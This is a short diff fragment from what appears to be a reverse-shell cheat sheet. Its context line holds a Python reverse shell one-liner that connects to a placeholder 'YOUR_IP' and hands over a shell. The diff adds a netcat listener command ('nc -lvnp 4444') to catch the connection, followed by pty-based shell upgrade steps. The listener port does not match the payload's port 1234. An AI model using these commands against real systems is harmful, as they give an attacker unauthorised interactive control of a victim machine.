@@ -187,6 +187,9 @@ import socket,subprocess,os; s=socket.socket(); s.connect(("YOUR_IP",1234)); os.
    🛠️ Post-Reverse Shell Upgrade (Optional)\
 Once you catch the shell:
 
+
+nc -lvnp 4444
+
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
